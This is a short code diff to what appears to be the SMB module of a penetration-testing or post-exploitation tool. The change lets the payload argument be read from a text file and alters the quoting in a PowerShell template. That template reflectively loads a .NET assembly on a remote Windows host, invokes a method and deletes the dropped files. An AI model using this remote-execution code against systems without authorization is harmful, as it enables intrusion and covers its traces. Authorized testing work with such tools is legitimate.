@@ -43,6 +43,7 @@ from datetime import datetime
 from functools import wraps
 from traceback import format_exc
 from pathlib import Path
+from binaryornot.check import is_binary
 
 smb_share_name = gen_random_string(5).upper()
 smb_server = None
@@ -595,6 +596,10 @@ class smb(connection):
         if hasattr(self, 'server'): self.server.track_host(self.host)
 
         if self.args.dotnetassembly:
+            if os.path.isfile(payload) and not is_binary(payload):
+                with open(payload, 'r') as f:
+                    payload = f.read()
+
             dotnetassembly_path = Path(payload.split()[0])
             with open(dotnetassembly_path, 'rb') as f:
                 deflate_stream = zlib.compressobj(zlib.Z_DEFAULT_COMPRESSION, zlib.DEFLATED, -15)
@@ -640,7 +645,7 @@ class smb(connection):
                 $g = [Reflection.BindingFlags]"Public,NonPublic,Static"
                 $h = $f.GetType("{dotnetassembly_namespace}.{dotnetassembly_class}", $g)
                 $i = $h.GetMethod("{dotnetassembly_method}", $g)
-                $i.Invoke($null, (, "{dotnetassembly_args}"{dotnetassembly_arg_type}))
+                $i.Invoke($null, (, '{dotnetassembly_args}'{dotnetassembly_arg_type}))
                 rm {dotnetassembly_remote_path}
                 rm {ps_payload_remote_path}'''
 
